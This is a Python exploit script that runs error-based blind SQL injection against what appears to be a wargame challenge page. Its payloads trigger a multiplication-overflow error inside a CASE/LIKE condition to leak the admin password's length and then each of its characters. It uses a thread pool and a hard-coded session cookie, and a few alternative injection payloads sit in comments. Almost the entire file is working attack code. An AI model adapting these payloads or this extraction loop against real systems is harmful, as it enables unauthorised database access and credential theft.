import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
charset = string.ascii_letters + string.digits
true_cond = "<hr><br>error"
max_len = 50
max_workers = 10

# create session with cookie
session = requests.Session()
session.cookies.set("PHPSESSID", "02jmu8p54lc2d2qk2o14jb6s9o")

def check_condition(payload):
    params = {"pw": payload}
    try:    
        r = session.get(url, params=params, timeout=5)
        # print(f"[+] url: {r.url}")
        return true_cond in r.text
    except requests.RequestException:
        return False

def get_length():
    for n in range(1, max_len + 1):
        payload = f"' or id='admin' and case when pw like 0x{n*'5f'} then 7700000000000000*7700000000000000 else 1 end -- "
        if check_condition(payload):
            print(f"[i] Length of pw: {n}")
            return n
    print(f"[i] Could not determine length (max_len reached)")
    return max_len

def check_char(flag, ch):
    # payload = f"IF(ascii(substr(email,{pos},1))={ord(ch)},id,score)"
    # payload = f"(select exp(770) where ascii(substr((select email where id='admin'),{pos},1))={ord(ch)})"
    payload = f"' or id='admin' and case when pw like '{re.escape(flag + ch)}%' then 7700000000000000*7700000000000000 else 1 end -- "

    return ch if check_condition(payload) else None

def mask_secret(secret, total_len):
    """Pad secret with * until reaching total_len"""
    return secret + "*" * (total_len - len(secret))

def extract(initial_flag=""):
    length = get_length()
    # length = 8
    result = list(initial_flag)

    start_pos = len(initial_flag) + 1
    if initial_flag:
        print(f"[i] Starting with initial flag: {initial_flag}")
        print(f"[i] Masked: {mask_secret(initial_flag, length)}")

    for pos in range(start_pos, length + 1):
        found_char = None

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_char = {executor.submit(check_char, ''.join(result), ch): ch for ch in charset}
            for future in as_completed(future_to_char):
                ch = future.result()
                if ch:
                    found_char = ch
                    for f in future_to_char:
                        f.cancel()
                    break

        if not found_char:
            print(f"[-] No character found at position {pos}, stopping.")
            break

        result.append(found_char)
        print(f"[+] Position {pos}: {mask_secret(''.join(result), length)}")

    extracted = "".join(result)
    print(f"\n[+] Extraction complete:\n{extracted}")
    return extracted

if __name__ == "__main__":
    # You can set your known prefix here
    extract(initial_flag="")
